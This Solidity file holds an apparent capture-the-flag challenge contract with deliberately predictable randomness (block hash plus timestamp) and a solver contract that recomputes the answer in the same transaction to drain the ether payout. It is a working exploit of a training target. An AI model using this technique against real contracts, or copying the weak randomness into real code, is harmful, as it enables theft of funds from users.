pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolver {
    IGuessTheNewNumberChallenge public challenge;
    address public owner;

    function GuessTheNewNumberSolver(address _challengeAddress) public {
        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        require(msg.value == 1 ether, "You must send an ether, first");

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(block.blockhash(block.number - 1), now)
                )
            )
        );

        challenge.guess.value(1 ether)(answer);
        msg.sender.transfer(address(this).balance);
    }

    function() external payable {}
}
